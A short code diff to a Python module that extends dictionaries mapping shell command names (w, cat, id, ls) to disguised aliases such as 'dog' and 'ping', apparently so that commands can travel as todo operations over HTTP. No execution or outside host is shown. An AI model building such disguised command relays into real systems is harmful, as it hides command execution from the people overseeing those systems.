@@ -11,19 +11,22 @@ from myhttp import get_file, update_file
 opmap = {
     'w': 'a',
     'cat': 'dog',
-    'id': 'ls'
+    'id': 'ls',
+    'ls': 'ping',
 }
 
 reverse_opmap = {
     'a': 'w',
     'dog': 'cat',
-    'ls': 'id'
+    'ls': 'id',
+    'ping': 'ls',
 }
 
 has_args = {
     'w': False,
     'cat': True,
     'id': False,
+    'ls': True,
 }
 
 def add_todo(name: str, id: str, task: str, operation: str, args: str = ""):
